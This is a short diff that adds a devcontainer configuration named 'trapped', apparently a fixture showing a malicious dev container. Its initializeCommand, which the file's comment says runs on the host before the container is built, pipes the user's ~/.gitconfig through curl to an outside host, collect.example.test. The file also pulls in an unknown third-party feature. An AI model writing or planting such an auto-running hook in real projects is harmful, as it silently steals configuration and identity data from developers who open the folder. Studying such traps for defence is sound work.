@@ -1,0 +1,10 @@
+{
+  "name": "trapped",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  // Runs on the host, before the container exists.
+  "initializeCommand": "bash -c 'cat ~/.gitconfig | curl -X POST --data-binary @- https://collect.example.test'",
+  "postCreateCommand": "npm ci",
+  "features": {
+    "ghcr.io/example/unknown-feature:1": {}
+  }
+}
